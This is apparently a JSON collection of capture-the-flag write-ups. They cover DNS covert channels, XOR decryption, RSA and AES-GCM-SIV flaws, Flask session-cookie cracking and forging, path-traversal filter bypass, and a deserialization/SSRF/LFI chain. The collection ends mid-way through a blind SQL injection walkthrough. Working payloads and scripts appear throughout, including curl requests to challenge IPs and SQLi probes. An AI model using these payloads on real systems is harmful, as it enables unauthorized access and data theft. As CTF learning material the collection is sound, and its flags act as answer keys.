                "writeup": "<h3>Analysis</h3>\nWe started by analyzing the provided capture file <code>weird.pcap</code>.\nA protocol hierarchy check (<code>tshark -z io,phs</code>) revealed significant DNS traffic.\n<p>Inspecting the DNS queries specifically:\n<pre><code class=\"bash\">tshark -r weird.pcap -Y dns -T fields -e dns.qry.name\n</code></pre></p>\n<p>We observed a series of suspicious reverse DNS lookup (PTR) queries in the format <code><IP>.in-addr.arpa</code>:</p>\n<pre><code class=\"\">85.78.76.80.in-addr.arpa\n123.67.48.118.in-addr.arpa\n51.114.84.95.in-addr.arpa\n95.99.104.52.in-addr.arpa\n110.78.101.124.in-addr.arpa\n95.85.115.49.in-addr.arpa\n110.103.95.68.in-addr.arpa\n78.83.33.33.in-addr.arpa\n125.192.180.219.in-addr.arpa\n</code></pre>\n<h3>Decoding</h3>\nThe \"IP addresses\" being queried appeared to be carriers for the flag data rather than legitimate network addresses. We extracted the octets from the IPs and converted them to ASCII.\n<p>For example, the first IP <code>85.78.76.80</code>:\n<ul>\n<li>85 -> U</li>\n<li>78 -> N</li>\n<li>76 -> L</li>\n<li>80 -> P</li>\n</ul>\nProceeding with the full list:\n1. 85.78.76.80     -> UNLP\n2. 123.67.48.118   -> {C0v\n3. 51.114.84.95    -> 3rT_\n4. 95.99.104.52    -> _ch4\n5. 110.78.101.124  -> nNe|\n6. 95.85.115.49    -> _Us1\n7. 110.103.95.68   -> ng_D\n8. 78.83.33.33     -> NS!!\n9. 125...          -> } (plus padding/noise)</p>\n<h3>Flag</h3>\nConcatenating the decoded segments reveals the flag:\n<p><code>UNLP{C0v3rT__ch4nNe|_Us1ng_DNS!!}</code></p>\n"
            },
            {
                "id": "xtrings",
                "title": "Xtrings",
                "category": "Miscellaneous",
                "tags": [
                    "xor"
                ],
                "writeup": "<p>beginner\n1.  <strong>Initial Analysis:</strong>\n    The provided file was <code>windows_app.exe.xor</code>. The <code>.xor</code> extension suggested XOR encryption, and <code>windows_app.exe</code> indicated it was likely a Windows executable.</p>\n<p>2.  <strong>Determining the XOR Key:</strong>\n    Windows executables typically start with the \"MZ\" magic bytes (0x4D 0x5A). I inspected the first few bytes of <code>windows_app.exe.xor</code> using <code>head -c 32 windows_app.exe.xor | xxd</code>.\n    The first bytes were <code>09 15 c3 44 4c 53 44 4f...</code>\n    By XORing the first two bytes of the encrypted file with the expected \"MZ\" bytes, I tried to deduce the key:\n    <code>0x09 ^ 0x4D = 0x44</code>\n    <code>0x15 ^ 0x5A = 0x4F</code>\n    This suggested the key might start with <code>0x44 0x4F</code> (ASCII \"DO\").\n    Further analysis of the next byte, <code>0xc3</code>, against the expected <code>0x90</code> (common after MZ for the DOS stub), led to:\n    <code>0xc3 ^ 0x90 = 0x53</code> (ASCII \"S\").\n    This led to the hypothesis that the repeating XOR key was \"DOS\" (<code>0x44 0x4F 0x53</code>).\n    Applying this key to the first few bytes:\n    <code>09 ^ 44 = 4D ('M')</code>\n    <code>15 ^ 4F = 5A ('Z')</code>\n    <code>C3 ^ 53 = 90</code>\n    <code>44 ^ 44 = 00</code>\n    This matched the expected pattern for a DOS executable header.</p>\n<p>3.  <strong>Decryption:</strong>\n    A Python script (<code>decrypt.py</code>) was created to perform the XOR decryption using the repeating key \"DOS\".\n    <pre><code class=\"python\">    def xor_file(input_path, output_path, key):\n        key_bytes = key.encode('ascii')\n        key_len = len(key_bytes)</p>\n<p>with open(input_path, 'rb') as f_in, open(output_path, 'wb') as f_out:\n            chunk_size = 4096\n            offset = 0\n            while True:\n                chunk = f_in.read(chunk_size)\n                if not chunk:\n                    break</p>\n<p>decrypted_chunk = bytearray(len(chunk))\n                for i in range(len(chunk)):                                                                     decrypted_chunk[i] = chunk[i] ^ key_bytes[(offset + i) % key_len]</p>\n<p>f_out.write(decrypted_chunk)\n                offset += len(chunk)                                                                                                                                                        if __name__ == \"__main__\":\n        xor_file(\"windows_app.exe.xor\", \"windows_app.exe\", \"DOS\")\n        print(\"Decryption complete.\")\n    </code></pre>\n    The script was executed, generating the decrypted <code>windows_app.exe</code> file.</p>\n<p>4.  <strong>Flag Extraction:</strong>\n    Given the challenge name \"xtrings\", it was highly probable the flag was present as a string within the executable. The <code>strings</code> utility was used in conjunction with <code>grep</code> to search for common flag patterns:\n    <code>strings windows_app.exe | grep -i \"flag\"</code>\n    This command revealed the flag.</p>\n<p><strong>Flag:</strong> <code>UNLP{X0R_4nD_str1nG5}</code></p>\n"
            },
            {
                "id": "crackme",
                "title": "crackme",
                "category": "Miscellaneous",
                "tags": [
                    "buffer",
                    "stack",
                    "reverse",
                    "assembly",
                    "crack"
                ],
                "writeup": "<h3>Tools Used</h3>\n<ul>\n<li><code>file</code>: To identify the type of the executable.</li>\n<li><code>strings</code>: To extract printable strings from the binary.</li>\n<li><code>objdump</code>: To disassemble the executable and inspect its sections.</li>\n</ul>\n<h3>Analysis Steps</h3>\n<h4>1. Initial Reconnaissance</h4>\nFirst, I used <code>file</code> to determine the executable's type:\n<pre><code class=\"bash\">file crackme\n&lt;h2&gt;Output: crackme: ELF 64-bit LSB pie executable, x86-64, ... not stripped&lt;/h2&gt;\n</code></pre>\nThe output indicated it was a 64-bit ELF executable and, crucially, \"not stripped\", meaning symbol information was still present, which simplifies reverse engineering.\n<p>Next, I ran <code>strings</code> to look for any immediately obvious clues, such as hardcoded passwords, error messages, or flag formats.\n<pre><code class=\"bash\">strings crackme | head -n 20\n</code></pre>\nThis revealed several interesting strings:\n<ul>\n<li>\"Enter your username:\"</li>\n<li>References to OpenSSL functions like <code>EVP_DigestInit_ex</code>, <code>EVP_sha256</code>, <code>EVP_DigestUpdate</code>, <code>EVP_DigestFinal_ex</code>. This immediately suggested that a SHA-256 hash calculation was involved.</li>\n</ul>\n<h4>2. Disassembly and Logic Flow</h4>\nGiven the SHA-256 references, the next step was to disassemble the <code>main</code> function using <code>objdump</code> to understand the program's logic flow.</p>\n<pre><code class=\"bash\">objdump -d -M intel --no-show-raw-insn crackme | grep -A 50 \"&lt;main&gt;:\"\n</code></pre>\nThe disassembly revealed a two-stage authentication process:\n<p>#### Stage 1: Username Check\nThe program first prompts for a username. It then compares this input using <code>strcmp</code> against a hardcoded string. If the username is incorrect, the program exits. The target username was found by inspecting the address referenced by the <code>strcmp</code> call (e.g., <code>lea rax,[rip+0xc24] # 205a <k4+0x3a></code>).\nBy examining the <code>.rodata</code> section at <code>0x205a</code>, the username was identified as:\n<pre><code class=\"\">&lt;h2&gt;From objdump -s -j .rodata crackme&lt;/h2&gt;\n...\n 2050 726e616d 65006164 6d696e00   username.admin.\n...\n</code></pre>\nThe username required is <code>admin</code>.</p>\n<p>#### Stage 2: Password Hash Check\nAfter a successful username entry, the program prompts for a \"password\". This input is then passed to a function <code>compute_sha256</code> (which uses the OpenSSL functions identified earlier). The resulting SHA-256 hash (32 bytes) is then compared using <code>memcmp</code> against a hardcoded 32-byte value stored on the stack.</p>\n<p>The hardcoded target hash was constructed from four 8-byte (QWORD) values, <code>k1</code>, <code>k2</code>, <code>k3</code>, and <code>k4</code>, loaded from the <code>.rodata</code> section into a stack buffer at the beginning of the <code>main</code> function.</p>\n<p>To retrieve the complete 32-byte hash, the <code>.rodata</code> section was dumped:\n<pre><code class=\"bash\">objdump -s -j .rodata crackme\n</code></pre>\nThe relevant bytes were found concatenated from <code>0x2008</code>:\n<ul>\n<li><code>k1</code> (at <code>0x2008</code>): <code>fcf730b6d95236ec</code></li>\n<li><code>k2</code> (at <code>0x2010</code>): <code>d3c9fc2d92d7b6b2</code></li>\n<li><code>k3</code> (at <code>0x2018</code>): <code>bb061514961aec04</code></li>\n<li><code>k4</code> (at <code>0x2020</code>): <code>1d6c7a7192f592e4</code></li>\n</ul>\nConcatenating these bytes (in hex format) yielded the target SHA-256 hash:\n<code>fcf730b6d95236ecd3c9fc2d92d7b6b2bb061514961aec041d6c7a7192f592e4</code></p>\n<h4>3. Solution</h4>\nThe username is <code>admin</code>.\nThe target SHA-256 hash is <code>fcf730b6d95236ecd3c9fc2d92d7b6b2bb061514961aec041d6c7a7192f592e4</code>.\n<p>The user provided the plaintext password <code>secret123</code> which hashes to this value.</p>\n<h3>The Flag</h3>\nBy entering <code>admin</code> as the username and <code>secret123</code> as the password, the program would accept the input. The flag format is <code>UNLP{<password>}</code>.\n<p>Therefore, the flag is:\n<code>UNLP{secret123}</code></p>\n"
            },
            {
                "id": "qrcodes",
                "title": "qrcodes",
                "category": "Miscellaneous",
                "tags": [],
                "writeup": "<p>Works if you scan the qr on Phones</p>\n<h3>Flag: <code>UNLP{DualQR_C0d3s_4r3_Aw3s0m3!}</code></h3>\n"
            }
        ]
    },
    "BackdoorCTF 2025": {
        "rank": "79th place",
        "description": "Advanced competition featuring challenging pwn and reverse engineering problems.",
        "challenges": [
            {
                "id": "ambystoma-mexicanum",
                "title": "Ambystoma Mexicanum",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "aes",
                    "cipher"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>We're given a cryptographic service that uses AES-GCM-SIV encryption. The goal is to make the service output the flag by crafting a ciphertext that, when decrypted with multiple keys, produces the message \"gib me flag plis\".</p>\n<h3>Initial Analysis</h3>\n<p>Looking at the challenge code, the service provides several options:\n1. Rotate key (generates a new random key)\n2. Debug (shows keys, ciphertexts, and nonce)\n3. Push ciphertext (allows us to submit one ciphertext)\n4. Request flag (attempts to verify our message)</p>\n<h4>The Flag Request Logic</h4>\n<p>The critical part of the code is in option 4:</p>\n<pre><code class=\"python\">for i in range(4):\n    key = binascii.unhexlify(KEYS[i % len(KEYS)])\n    ct = binascii.unhexlify(CIPHERTEXTS[i % len(CIPHERTEXTS)])\n<p>text = service.decrypt(ct, key)[16 * i:16 * (i+1)].decode('utf-8').strip()</p>\n<p>if not text or len(text) == 0:\n        print(\"why so rude :(\\n\")\n        exit(0)</p>\n<p>usertext += text</p>\n<p>if usertext == REQUEST:  # REQUEST = \"gib me flag plis\"\n    print(f\"Damn, you are something. Here is the flag: {FLAG}\\n\")\n</code></pre></p>\n<p>This code:\n1. Loops 4 times\n2. Uses modulo to cycle through available keys and ciphertexts\n3. Decrypts the ciphertext with each key\n4. Extracts a different 16-byte slice from each decryption: <code>[0:16]</code>, <code>[16:32]</code>, <code>[32:48]</code>, <code>[48:64]</code>\n5. Strips whitespace and concatenates all chunks\n6. Checks if the result equals \"gib me flag plis\"</p>\n<h3>Finding the Vulnerability</h3>\n<h4>Initial Thoughts</h4>\n<p>At first glance, this seems impossible. With 4 different keys, you'd need:\n<ul>\n<li>A ciphertext that decrypts successfully with all 4 keys (AES-GCM-SIV has authentication!)</li>\n<li>Each decryption producing the right bytes at the right positions</li>\n</ul>\n<h4>The Key Insight</h4></p>\n<p>The breakthrough comes from understanding the modulo operators:\n<ul>\n<li><code>KEYS[i % len(KEYS)]</code> - cycles through available keys</li>\n<li><code>CIPHERTEXTS[i % len(CIPHERTEXTS)]</code> - cycles through available ciphertexts</li>\n</ul>\n<strong>If we DON'T rotate the key</strong>, <code>len(KEYS)</code> remains 1, meaning:\n<ul>\n<li><code>KEYS[0 % 1] = KEYS[0]</code></li>\n<li><code>KEYS[1 % 1] = KEYS[0]</code></li>\n<li><code>KEYS[2 % 1] = KEYS[0]</code></li>\n<li><code>KEYS[3 % 1] = KEYS[0]</code></li>\n</ul>\nAll iterations use the <strong>same key</strong>! And with one ciphertext, all iterations use the <strong>same ciphertext</strong> too!</p>\n<h3>The Solution Strategy</h3>\n<p>Since all iterations use the same key and ciphertext, we just need to:\n1. Create a 64-byte plaintext\n2. Position our target message so each 16-byte extraction gives us the right part\n3. Encrypt it with the single key\n4. Handle the <code>.strip()</code> method carefully</p>\n<h4>Handling <code>.strip()</code></h4>\n<p>The tricky part is that <code>.strip()</code> removes <strong>all leading and trailing whitespace</strong>. The target message is \"gib me flag plis\" (16 characters with spaces between words).</p>\n<p>If we split it as: \"gib \" + \"me \" + \"flag \" + \"plis\", the <code>.strip()</code> will remove trailing spaces, giving us \"gibmeflagplis\" (no spaces).</p>\n<p><strong>Solution</strong>: Split the message so spaces are in the MIDDLE of chunks, where <code>.strip()</code> won't touch them:\n<ul>\n<li>Chunk 0 [0:16]: \"gib m\" (5 chars) + padding</li>\n<li>Chunk 1 [16:32]: \"e fla\" (5 chars) + padding</li>\n<li>Chunk 2 [32:48]: \"g pli\" (5 chars) + padding</li>\n<li>Chunk 3 [48:64]: \"s\" (1 char) + padding</li>\n</ul>\nAfter <code>.strip()</code> and concatenation: \"gib m\" + \"e fla\" + \"g pli\" + \"s\" = \"gib me flag plis\" \u2713</p>\n<h3>Exploit Code</h3>\n<pre><code class=\"python\">from cryptography.hazmat.primitives.ciphers.aead import AESGCMSIV\nimport binascii\n<p>&lt;h2&gt;Get key and nonce from debug option (don't rotate keys!)&lt;/h2&gt;\nKEY_HEX = \"b2e12b64da4c319a037ea801ed0b1eda\"\nNONCE_HEX = \"358cef8f8b551be7b1a3ce2d\"</p>\n<p>TARGET = \"gib me flag plis\"</p>\n<p>key = binascii.unhexlify(KEY_HEX)\nnonce = binascii.unhexlify(NONCE_HEX)\naead = b\"\"</p>\n<p>&lt;h2&gt;Create plaintext with spaces in the middle of chunks&lt;/h2&gt;\nplaintext = b'gib m           '  # -&gt; \"gib m\"\nplaintext += b'e fla           '  # -&gt; \"e fla\"\nplaintext += b'g pli           '  # -&gt; \"g pli\"\nplaintext += b's               '  # -&gt; \"s\"</p>\n<p>&lt;h2&gt;Encrypt&lt;/h2&gt;\ncipher = AESGCMSIV(key)\nciphertext = cipher.encrypt(nonce, plaintext, aead)</p>\n<p>print(f\"Ciphertext: {ciphertext.hex()}\")\n</code></pre></p>\n<h3>Exploitation Steps</h3>\n<p>1. Connect to the service: <code>nc remote.infoseciitr.in 4004</code>\n2. <strong>DON'T</strong> choose option 1 (don't rotate keys!)\n3. Choose option 2 (debug) to get the initial key and nonce\n4. Run the exploit script with the key and nonce\n5. Choose option 3 and paste the generated ciphertext\n6. Choose option 4 to get the flag!</p>\n<h3>Key Takeaways</h3>\n<p>1. <strong>Modulo arithmetic matters</strong>: The use of <code>% len(KEYS)</code> meant we could bypass the multi-key requirement entirely\n2. <strong>Read the code carefully</strong>: The vulnerability wasn't in the crypto itself, but in how the keys were managed\n3. <strong>String manipulation edge cases</strong>: Understanding exactly how <code>.strip()</code> works was crucial for crafting the right plaintext\n4. <strong>Sometimes the simple solution works</strong>: Instead of trying to break AES-GCM-SIV with nonce reuse, the real solution was to avoid using multiple keys at all</p>\n<h3>Flag</h3>\n<p>```\nflag{th3_4x0lo7ls_4r3_n07_wh47_th3y_s33m}</p>\n"
            },
            {
                "id": "bolt-fast",
                "title": "Bolt Fast",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "rsa",
                    "cipher"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>We are given a modified RSA implementation with the following files:\n<ul>\n<li><code>chall.py</code>: The key generation and encryption code</li>\n<li><code>output.txt</code>: The public key (N, e) and ciphertext (c)</li>\n</ul>\nFlag: <code>flag{w31n3r_d1dn7_73ll_y0u_70_b3_6r33dy}</code></p>\n<h3>Vulnerability Analysis</h3>\n<p>Looking at the key generation code in <code>chall.py</code>:</p>\n<pre><code class=\"python\">def flash_key():\n    while True:\n        p = getPrime(1024)\n        q = getPrime(1024)\n        N = p * q\n        dp_smart = getPrime(16)  # Only 16 bits!\n        try:\n            e = inverse(dp_smart, p-1)\n            return N, e, dp_smart\n        except ValueError:\n            continue\n</code></pre>\n<p>The vulnerability is clear: <code>dp_smart</code> is only a 16-bit prime (maximum value ~65536).</p>\n<p>The relationship is: <code>e * dp \u2261 1 (mod p-1)</code></p>\n<p>This means: <code>e * dp = 1 + k * (p-1)</code> for some integer k</p>\n<p>Rearranging: <code>p = (e * dp - 1) / k + 1</code></p>\n<h3>Attack Strategy</h3>\n<p>Since dp is so small (only 16 bits), we can brute force it:</p>\n<p>1. Iterate through all 16-bit primes for dp (roughly 6,500 primes)\n2. For each dp, compute <code>e * dp - 1</code>\n3. Try different values of k to find when <code>(e * dp - 1) / k + 1</code> gives us a valid factor of N\n4. Once we find p, compute q = N / p\n5. Calculate the private key d and decrypt the message</p>\n<h3>Solution Code</h3>\n<pre><code class=\"python\">from Crypto.Util.number import long_to_bytes, isPrime\n<p>N = 22061149554706951873851465765917042279909309233484615798640186468876401527123242297915465375459511054772541825273007749026648641620485458471351811298443479262277231839408201654282927999029324652496830649919637863202844794784443579336735415046336390091671003022244732389217910334465895328371360158510046347031294125509649474722535171601096998732929497780870057433634214228116293166963101489644680801538837005001377764416442380530464289453201654394144682138927826247301956954884930328147978637795259346321547054237005318172528896865428457293207571804464061990459958593520373578234234490804585522859401957032395007142007\ne = 9648003423571638489624579625383119603270189664714210175737275695548206153582516635644990660189908448510652756058045483763071850222529184219333877863638216254054444012130393864033392161426815671725858723096432660521038315432183692553568344247916320931122090436770154203149432285380142051084178668290839858171\nc = 18817014323644102879407569381912044887671193778381872592373573382139976320220125847317309926920208859012582031032930373240219755720268543444729983316326640661427616841700761054678137741340093140586895094016730198447552611014038632666821117758006775144046000049080406858764900680265384743839472653817299383323869146152251839342236631780818396088131196202767951301023089053662813175083035336272981588533957561537975684034210166185396046071368061264321959248372783262788158418696375783427276741258526067168910326630496339287237940444426277757582174810909733937257258767407189452212391936958267819666424558678534741723930</p>\n<p>print(\"Brute forcing 16-bit dp values...\")</p>\n<p>for dp in range(2, 65536):\n    if not isPrime(dp):\n        continue</p>\n<p>edp_minus_1 = e * dp - 1</p>\n<p>for k in range(1, 100000):\n        if edp_minus_1 % k != 0:\n            continue</p>\n<p>p_minus_1 = edp_minus_1 // k\n        p = p_minus_1 + 1</p>\n<p>if p &gt; 1 and p &lt; N and N % p == 0:\n            q = N // p</p>\n<p>if p * q == N:\n                print(f\"Found: dp={dp}, k={k}\")</p>\n<p>phi = (p - 1) * (q - 1)\n                d = pow(e, -1, phi)\n                m = pow(c, d, N)\n                flag = long_to_bytes(m)</p>\n<p>print(f\"FLAG: {flag.decode()}\")\n                exit()\n</code></pre></p>\n"
            },
            {
                "id": "flask-of-cookies",
                "title": "Flask Of Cookies",
                "category": "Web Exploitation",
                "tags": [
                    "web",
                    "http",
                    "flask",
                    "cookie",
                    "reverse",
                    "crack"
                ],
                "writeup": "<h3>Challenge Description</h3>\nA web exploitation challenge involving a Flask application where the goal is to gain administrative access to retrieve a flag.\n<h3>Analysis</h3>\n<h4>Source Code Review</h4>\nThe provided <code>app.py</code> reveals the core logic:\n<pre><code class=\"python\">def derived_level(sess, secret_key):\n    user = sess.get(\"user\", \"\")\n    role = sess.get(\"role\", \"\")\n    if role == \"admin\" and user == secret_key[::-1]:\n        return \"superadmin\"\n    return \"user\"\n<p>@app.route(\"/admin\")\ndef admin():\n    level = derived_level(session, app.secret_key)\n    if level == \"superadmin\":\n        return render_template(\"admin.html\", flag=flag_value)\n    return \"Access denied.\\n\", 403\n</code></pre></p>\n<p>To get the flag, we need to satisfy two conditions in our session:\n1. <code>role</code> must be set to <code>\"admin\"</code>.\n2. <code>user</code> must be the <strong>reverse</strong> of the server's <code>SECRET_KEY</code>.</p>\n<h4>The Problem</h4>\nThe <code>SECRET_KEY</code> is loaded from the environment variables. The local <code>.env</code> file provided in the download contained a placeholder (<code><fake_secret_key></code>), which does not work on the remote server.\n<p>There was a misleading string in the EXIF data of <code>static/cookie.jpg</code> (<code>fPCwmvV/0a2Rul8RgRsZdaiP8Pfn1EvJXXrJLvSwmAM=</code>), but this turned out to be a rabbit hole (or a hash of a key we couldn't easily crack).</p>\n<h3>Exploitation</h3>\n<h4>1. Obtaining the Secret Key</h4>\nSince we have a valid session cookie from the server (by visiting the homepage), and the server is likely using a weak secret key, we can attempt to brute-force it using <code>flask-unsign</code>.\n<p><strong>Command:</strong>\n<pre><code class=\"bash\">flask-unsign --unsign --cookie \"&lt;server_cookie&gt;\" --wordlist /usr/share/wordlists/rockyou.txt\n</code></pre></p>\n<p><strong>Result:</strong>\nThe tool successfully cracks the signature and reveals the secret key: <code>qwertyuiop</code>.</p>\n<h4>2. Forging the Admin Cookie</h4>\nWith the secret key (<code>qwertyuiop</code>), we can now forge a valid session cookie that satisfies the exploit conditions.\n<ul>\n<li>  <strong>Secret Key:</strong> <code>qwertyuiop</code></li>\n<li>  <strong>Target Role:</strong> <code>admin</code></li>\n<li>  <strong>Target User:</strong> <code>poiuytrewq</code> (The secret key reversed)</li>\n</ul>\n<strong>Forge Script:</strong>\n<pre><code class=\"python\">from flask.sessions import SecureCookieSessionInterface\nfrom flask import Flask\n<p>app = Flask(__name__)\napp.secret_key = \"qwertyuiop\"</p>\n<p>session_interface = SecureCookieSessionInterface()\nserializer = session_interface.get_signing_serializer(app)</p>\n<p>session_data = {\"user\": \"poiuytrewq\", \"role\": \"admin\"}\ncookie_val = serializer.dumps(session_data)</p>\n<p>print(f\"Forged Cookie: {cookie_val}\")\n</code></pre></p>\n<h4>3. Retrieving the Flag</h4>\nWe send the forged cookie to the <code>/admin</code> endpoint.\n<p><strong>Command:</strong>\n<pre><code class=\"bash\">curl -H \"Cookie: session=&lt;forged_cookie&gt;\" http://104.198.24.52:6011/admin\n</code></pre></p>\n<p><strong>Response:</strong>\nThe server accepts the cookie as valid superadmin credentials and returns the page containing the flag.</p>\n<h3>Flag</h3>\n<pre><code class=\"\">flag{y0u_l34rn3ed_flask_uns1gn_c0ok1e}\n</code></pre>\n"
            },
            {
                "id": "fractonacci",
                "title": "Fractonacci",
                "category": "Forensics",
                "tags": [
                    "image"
                ],
                "writeup": "<h3>Challenge Description</h3>\n\"Beautiful. Red. Fractonacci. What could this mean??\"\nWe are provided with an image <code>fractonacci.png</code>.\n<h3>Solution</h3>\n<p>1. <strong>Analysis</strong>:\n<ul>\n<li>The image is a large PNG (6000x6000).</li>\n<li>The name \"Fractonacci\" suggests a connection to Fractals and Fibonacci numbers.</li>\n<li>The hint \"Red\" suggests looking at the Red color channel.</li>\n</ul>\n2. <strong>Extraction</strong>:\n<ul>\n<li>We extracted the Red channel data from the image.</li>\n<li>Using <code>imagemagick</code>:</li>\n</ul>\n     <pre><code class=\"bash\">     convert challenge.png -channel R -separate -depth 8 red.gray\n     </code></pre></p>\n<p>3. <strong>Decoding</strong>:\n<ul>\n<li>We wrote a Python script to analyze the raw bytes of the Red channel (<code>red.gray</code>).</li>\n<li>Following the \"Fibonacci\" hint, we examined the byte values at indices corresponding to the Fibonacci sequence (1, 2, 3, 5, 8, 13, ...).</li>\n<li>The sequence $F_n$ where $F_0=0, F_1=1, F_{n}=F_{n-1}+F_{n-2}$.</li>\n<li>We extracted bytes at indices: 1, 2, 3, 5, 8, 13, 21, ...</li>\n</ul>\n4. <strong>Result</strong>:\n<ul>\n<li>The extracted characters formed the string: <code>lag{n3wt0n_fr4c74l5_4r3_b34u71ful}</code>.</li>\n<li>Prepending the missing 'f' (which would correspond to a theoretical earlier index or just implied), we get the complete flag.</li>\n</ul>\n<h3>Flag</h3>\n<code>flag{n3wt0n_fr4c74l5_4r3_b34u71ful}</code></p>\n"
            },
            {
                "id": "image-gallery",
                "title": "Image Gallery",
                "category": "Web Exploitation",
                "tags": [
                    "rsa",
                    "http",
                    "image"
                ],
                "writeup": "<p>Analysis:\n1.  <strong>Source Code Review</strong>: The challenge provides a source code archive (<code>gallery.zip</code>). Analyzing <code>server.js</code>, we find an express server with an endpoint <code>/image</code>.\n2.  <strong>Vulnerable Endpoint</strong>: The <code>/image</code> endpoint takes a <code>file</code> query parameter to serve images from the <code>images</code> directory (<code>BASE_DIR</code>).\n    <pre><code class=\"javascript\">    const BASE_DIR = path.join(__dirname, 'images');\n    // ...\n    app.get('/image', (req, res) =&gt; {\n      let file = req.query.file || '';\n      // ...\n      file = file.replace(/\\\\/g, '/');\n      file = file.split('../').join(''); // Vulnerable sanitization\n      const resolved = path.join(BASE_DIR, file);\n      // ...\n      fs.readFile(resolved, (err, data) =&gt; { ... });\n    });\n    </code></pre>\n3.  <strong>Sanitization Flaw</strong>: The code attempts to prevent path traversal by removing <code>../</code> using <code>split('../').join('')</code>. However, this is not recursive. It effectively removes all occurrences of <code>../</code> present *initially*, but does not check if new <code>../</code> sequences are formed *after* the removal.</p>\n<p>Exploit:\n1.  <strong>Bypassing the Filter</strong>: If we send the string <code>....//</code>, the code splits it by <code>../</code>.\n<ul>\n<li>  <code>\"....//\".split('../')</code> results in <code>[\"..\", \"/\"]</code>.</li>\n<li>  Joining them back together results in <code>../</code>.</li>\n</ul>\n2.  <strong>Target File</strong>: The file structure shows a <code>secret</code> directory at the same level as <code>images</code>.\n<ul>\n<li>  <code>gallery/images/</code> (Base Directory)</li>\n<li>  <code>gallery/secret/flag.txt</code></li>\n</ul>\n3.  <strong>Payload</strong>: To access <code>../secret/flag.txt</code>, we can use <code>....//secret/flag.txt</code>.\n4.  <strong>Execution</strong>:\n    <pre><code class=\"bash\">    curl \"http://104.198.24.52:6012/image?file=....//secret/flag.txt\"\n    </code></pre>\n    Response:\n    <pre><code class=\"\">    flag{sTr1pp1ng_d0Ts_and_SLasH3s_d03sNt_sTr1p_bUgs}\n    </code></pre></p>\n"
            },
            {
                "id": "marketflow",
                "title": "Marketflow",
                "category": "Web Exploitation",
                "tags": [
                    "rsa",
                    "web",
                    "http"
                ],
                "writeup": "<h4>Vulnerability Analysis</h4>\n<p>1.  <strong>Insecure Deserialization:</strong>\n<ul>\n<li>  The endpoint <code>/api/analytics/reports</code> accepts a JSON payload and processes it using <code>ObjectManager.deserialize</code>.</li>\n<li>  This method allows instantiating any class registered in <code>CLASS_REGISTRY</code> with arbitrary constructor arguments.</li>\n<li>  This is the entry point for the exploit chain.</li>\n</ul>\n2.  <strong>Arbitrary File Write (Gadget Chain):</strong>\n<ul>\n<li>  The <code>Scheduler</code> processes tasks and, for <code>ReportConfiguration</code> objects, can trigger <code>cache_service.prime(output_config)</code>.</li>\n<li>  <code>CacheService.prime</code> calls <code>config.persistence.write(data)</code>.</li>\n<li>  <code>PersistenceAdapter.write</code> (the persistence object) uses <code>os.path.join</code> with user-controlled input. If an absolute path or path traversal (e.g., <code>../</code>) is provided, it can write to unintended locations.</li>\n<li>  This allows us to write arbitrary content to files in the writable directories (specifically <code>/var/tmp/sessionmaze/templates</code> via traversal).</li>\n</ul>\n3.  <strong>SSRF (Trigger Mechanism):</strong>\n<ul>\n<li>  The <code>Scheduler</code> only processes tasks when <code>/internal/cron/process</code> is called. This endpoint is restricted to <code>localhost</code>.</li>\n<li>  The <code>/api/webhooks/forward</code> endpoint uses <code>WebhookForwarder</code> to make HTTP requests.</li>\n<li>  Although there is a protection mechanism (<code>is_safe_url</code>), it can be bypassed using a domain that resolves to 127.0.0.1 (e.g., <code>localtest.me</code>). This allows us to trigger the cron job externally.</li>\n</ul>\n4.  <strong>Local File Inclusion (LFI):</strong>\n<ul>\n<li>  The <code>TemplateRenderer</code> has a \"legacy\" mode for files ending in <code>.tpl</code>.</li>\n<li>  If a template contains <code>@config: /path/to/file</code>, the renderer reads that file and includes its content in the output HTML.</li>\n<li>  By writing a malicious <code>.tpl</code> file (using the file write vulnerability) and then instructing the application to use it as a template, we can read <code>/flag.txt</code>.</li>\n</ul>\n<h4>Exploit Summary</h4></p>\n<p>I created and executed an exploit script (<code>exploit.py</code>) that performed the following steps:\n1.  <strong>Register & Login:</strong> Created a user to access the authenticated API.\n2.  <strong>Stage 1 (Write):</strong> Scheduled a malicious task to write a file named <code>exploit.tpl</code> to <code>../templates/exploit.tpl</code> (which resolves to <code>/var/tmp/sessionmaze/templates/exploit.tpl</code>). The content included <code>@config: /flag.txt</code>.\n3.  <strong>Trigger:</strong> Used the SSRF vulnerability to hit <code>http://localtest.me:5000/internal/cron/process</code>, forcing the scheduler to execute the write task.\n4.  <strong>Stage 2 (Read):</strong> Scheduled a second task to generate a report using the <code>exploit.tpl</code> template.\n5.  <strong>Trigger:</strong> Triggered the scheduler again.\n6.  <strong>Retrieve:</strong> Downloaded the generated report. The flag was embedded in an HTML comment within the report.</p>\n<h4>Flag</h4>\n<p><code>flag{n3st3d_d3s3r1al1z4t10n_ssrf_ch41n_c0mpl3t3_0b53wrf}</code></p>\n"
            },
            {
                "id": "no-sight",
                "title": "No Sight",
                "category": "Web Exploitation",
                "tags": [
                    "sql",
                    "injection"
                ],
                "writeup": "<h3>Reconnaissance</h3>\n1.  <strong>Initial Probing</strong>:\n<ul>\n<li>  Input <code>1</code> -> \"User found!\"</li>\n<li>  Input <code>999999</code> -> \"No user found\"</li>\n</ul>\n2.  <strong>Vulnerability Detection</strong>:\n<ul>\n<li>  We suspected SQL Injection.</li>\n<li>  Input <code>1 AND 1=1</code> -> \"User found!\" (True condition)</li>\n<li>  Input <code>1 AND 1=2</code> -> \"No user found\" (False condition)</li>\n<li>  This confirmed a <strong>Boolean-based Blind SQL Injection</strong> vulnerability. We can ask the database true/false questions and infer data based on the response.</li>\n</ul>\n<h3>Database Enumeration</h3>\n1.  <strong>Identifying the Database</strong>:\n<ul>\n<li>  Standard MySQL functions like <code>database()</code> and <code>version()</code> failed or were filtered.</li>\n<li>  We tested for SQLite by querying the <code>sqlite_master</code> table.</li>\n<li>  Payload: <code>1 AND (SELECT 1 FROM sqlite_master LIMIT 1) = 1</code> -> \"User found!\"</li>\n<li>  This confirmed the database is <strong>SQLite</strong>.</li>\n</ul>\n2.  <strong>Finding Tables</strong>:\n<ul>\n<li>  We knew there was likely a <code>users</code> table.</li>\n<li>  To find the flag, we searched for other tables. We checked for a second table in <code>sqlite_master</code>.</li>\n<li>  We wrote a Python script using binary search to extract the name of the table that is NOT 'users'.</li>\n<li>  Payload logic: <code>1 AND (SELECT SUBSTR(name, 1, 1) FROM sqlite_master 